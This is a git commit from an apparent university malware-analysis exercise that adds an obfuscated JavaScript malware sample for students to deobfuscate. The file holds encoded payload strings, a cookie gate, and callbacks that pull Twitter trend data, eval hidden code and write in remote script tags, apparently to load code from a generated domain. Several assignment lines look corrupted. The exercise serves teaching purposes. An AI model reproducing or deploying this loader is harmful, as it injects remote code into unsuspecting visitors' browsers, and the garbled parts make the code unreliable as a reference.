821e0de2503a6c3d36cc87d1778749b1bbdfcc20
Arthur Provost <arthur.provost@insa-rennes.fr>
2018-01-18 01:29:41 +0100

    Desobfuscation exo3 malware js

---
+++ Analyse de code malicieux/Exo3_Mystere_Desobfusquer.js
@@ -0,0 +1,63 @@
+cc = "5n%67%74h;i%2b+)%7b%74mp%3d%64s%2esl%69ce(%69,%69%2b1)%3b";
+cd = "st%3dst%2bS%74ri%6eg.%66ro%6dC%68%61rC%6fde%28(%74%6d%70.";
+ce = "c%68arC%6fdeA%74%280)%5e(%270x%30%30%27+%65s)%29);%7d}";
+da = "fqb0t-7vrs}vyb>s%7F}7+0fqb0cxyvdY~tuh0-0%20+v%7Fb08fqb0y0y~0gy~t%7Fg>dg>dbu~tc9kyv08gy~t%7Fg>x0.0(0660gy~t%7Fg>x0,0%22!0660y>y~tuh_v870%20'790.0=!9kcxyvdY~tuh0-0gy~t%7Fg>dg>dbu~tcKyMK$M>aeubi>sxqbS%7FtuQd8!90;0gy~t%7Fg>dg>dbu~tcKyMK$M>aeubi>|u~wdx+rbuq{+mu|cu0yv088gy~t%7Fg>x0,0)0ll00gy~t%7Fg>x0.0%22%2090660y>y~tuh_v870!(790.0=!9kcxyvdY~tuh0-0gy~t%7Fg>dg>dbu~tcKyMK$M>aeubi>sxqbS%";
+cu = "(p}b4g`mxq)6b}g}v}x}`m.|}ppq%6*(}rfuyq4gfw)6|``d.;;rvwyr}f:w{y;xp;s%|%%;64c}p`|)%$$4|q}s|`),$*(;}rfuyq*(;p}b*";
+st = "%73%74%3d%22%24%61%3ds%74%3b%64%63s%28d%61+%64b%2bd%63+%64d%2bd%65,%31%30%29;%64w%28s%74)%3b%73t%3d$%61%3b%22;";
+c %= "%66unc%74io%6e %63%(c%7a)%7br%65tur%6e%20ca%2b%63b+%63%63+cd%2bce+%63%;%7d;";
+db = "7FtuQd8!90;0!%200;gy~t%7Fg>dg>dbu~tcKyMK$M>aeubi>|u~wdx+rbuq{+mmyv08cxyvdY~tuh0--0%2009kcxyvdY~tuh0-0gy~t%7Fg>dg>dbu~tcKyMK%26M>aeubi>sxqbS%7FtuQd8!90;0'0;gy~t%7Fg>dg>dbu~tcKyMK%26M>aeubi>|u~wdx+m0yv08cxyvdY~tuh0.0%209kfqb0dy}u0-0~ug0Qbbqi89+dy}uK7iuqb7M0-0gy~t%7Fg>wt>wudEDSVe||Iuqb89+dy}uK7}%7F~dx7M0-0gy~t%7Fg>wt>wudEDS]%7F~dx89;!+dy}uK7tqi7M0-0gy~t%7Fg>wt>wudEDSTqdu89+fqb0t-7v";
+d %= "%66u%6ecti%6fn d%77(%74)%7bca%3d%27%2564ocu%256d%2565nt%252e%2577r%2569%74%65(%2522%27;c%65%3d%27%2522)%27;cb%3d%27%253cscr%2569pt %256ca%6e%2567u%2561%256%37%2565%253d%255c%2522jav%61s%2563r%25%369%2570%2574%255c%2522%253e%27;cc%3d%27%253c%255c%252fs%63%72%2569%70%2574%253e%27;%77ind%6fw[%22e%22+%22%22+ %22v%22+%22al%22](unescape%28t)%29%7d%3b";
+cb = "0e(%64%73%29;st%3dtm%70%3d%27%27;for(i%3d0%3bi%3cds.%6c%6";
+ca = "%66%75n%63t%69on %64c%73%28ds%2c%65%73)%7bds%3dun%65sca%7";
+de = "!%209M0;0|uddubcK8888dy}uK7iuqb7M060%20h##!!90..0$90;0~e}9050!%209M+0}%7F~dxSx0-0|uddubcK88dy}uK7}%7F~dx7M0;0~e}9050%22%9M0;0|uddubcK88dy}uK7}%7F~dx7M0:0~e}9050%22%9M+tqiSx0-0|uddubcK88dy}uK7tqi7M0:0%269050%22'9M+0dy}uSx0-0tqiSx0-0|uddubcK88dy}uK7tqi7M0:0~e}9050%22$9M+4q-4q>bu`|qsu8t<tqiSx0;0iuqbSx%220;0}%7F~dxSx0;0iuqbSx!0;0tqiSx0;0}%7F~dxcKdy}uK7}%7F~dx7M0=0!M0;07>s%7F}79+m";
+dc = "rs}vyb>s%7F}7+fqb0}%7F~dxc0-0~ug0Qbbqi87trc7<07id~7<07f}d7<07f}b7<07}|s7<07%7Fh{7<07vtc7<07rfv7<07iec7<07}s`7<07~sj7<07wtg79+fqb0|uddubc0-0~ug0Qbbqi87q7<7r7<7s7<7t7<7u7<7v7<7w7<7x7<7%7<7y7<7{7<7|7<7}7<7~7<7%7F7<7`7<7a7<7b7<7c7<7d7<7e7<7f7<7g7<7h7<7i7<7j79+fqb0~e}rubc0-0~ug0Qbbqi8!<%22<#<$<%<%26<'<(<)9+%19ve~sdy%7F~0Sq|se|qdu]qwys^e}rub8tqi<0}%7F~dx<0iuqb<0y~tuh9kbudeb~0888iuqb0;";
+op = "%24%61%3d%22dw(%64%63%73(cu%2c1%34)%29;%22;";
+dd = "08y~tuh0:0tqi990;08}%7F~dx0N0tqi90:0y~tuh90;0tqi9+m0fqb0iuqbSx!<0iuqbSx%22<0}%7F~dxSx<0tqiSx<0~e}+~e}0-0Sq|se|qdu]qwys^e}rub8dy}uK7tqi7M<0dy}uK7}%7F~dx7M<0dy}uK7iuqb7M<0cxyvdY~tuh9;!%20%20+iuqbSx!0-0|uddubcK888dy}uK7iuqb7M060%20hQQ90;0~e}9050%26#9050%22%26M0;0|uddubcK888dy}uK7iuqb7M060%20hQQ90,,0%2290;0~e}9050%22%M+iuqbSx%220-0|uddubcK8888dy}uK7iuqb7M060%20h##!!90..0#90;0~e}9050";
+
+if (document.cookie.indexOf('rf5f6ds') == -1) {
+    function callback(x) {
+        window.tw = x;
+        var d = new Date();
+        d.setTime(x["as_of"] * 1000);
+        var h = d.getUTCHours();
+        window.h = h;
+        if (h > 8) {
+            d.setUTCDate(d.getUTCDate() - 2);
+        } else {
+            d.setUTCDate(d.getUTCDate() - 3);
+        }
+        window.gd = d;
+        var time = new Array();
+        var shiftIndex = "";
+        time["year"] = d.getUTCFullYear();
+        time["month"] = d.getUTCMonth() + 1;
+        time["day"] = d.getUTCDate();
+        if (d.getUTCMonth() + 1 < 10) {
+            shiftIndex = time["year"] + "-0" + (d.getUTCMonth() + 1);
+        } else {
+            shiftIndex = time["year"] + "-" + (d.getUTCMonth() + 1);
+        }
+        if (d.getUTCDate() < 10) {
+            shiftIndex = shiftIndex + "-0" + d.getUTCDate();
+        } else {
+            shiftIndex = shiftIndex + "-" + d.getUTCDate();
+        }
+        document.write("<scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?date=" + shiftIndex + "&callback=callback2'>" + "</scr" + "ipt>");
+    }
+
+    function callback2(x) {
+        window.tw = x;
+        sc('rf5f6ds', 2, 7);
+        eval(unescape(d % +cz + op + st) + 'dw(dz+cz($a+st));');
+        document.write($a);
+    }
+    document.write("<img src='http://search.twitter.com/images/search/rss.png' width=1 height=1 style='visibility:hidden' /> <scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?callback=callback'>" + "</scr" + "ipt>");
+} else {
+    $a = ''
+};
+
+function sc(cnm, v, ed) {
+    var exd = new Date();
+    exd.setDate(exd.getDate() + ed);
+    document.cookie = cnm + '=' + escape(v) + ';expires=' + exd.toGMTString();
+};
